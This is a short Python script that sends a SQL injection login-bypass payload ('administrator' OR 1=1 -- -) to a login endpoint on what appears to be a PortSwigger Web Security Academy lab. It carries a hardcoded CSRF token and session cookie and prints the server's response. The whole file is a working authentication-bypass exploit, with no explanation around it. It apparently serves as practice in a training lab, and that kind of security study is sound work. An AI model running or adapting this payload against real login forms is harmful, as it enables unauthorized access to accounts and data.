import requests

url = "https://0aa3008e04d009d080d7d5e400e800a6.web-security-academy.net/login"
payload = {
    "csrf":"lzIW1Vd5zVYSvWTshDrJUbm0KLDiPO8v",
    "username":"administrator' OR 1=1 -- -",
    "password":"123"
}
headers ={
    "Cookie":"session=pF7FT4h7sd8iEN2HMwV4edulzTX98Ynk",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded"
}

res=requests.post(url,headers=headers,data=payload)
print(res.status_code)
print(res.text)
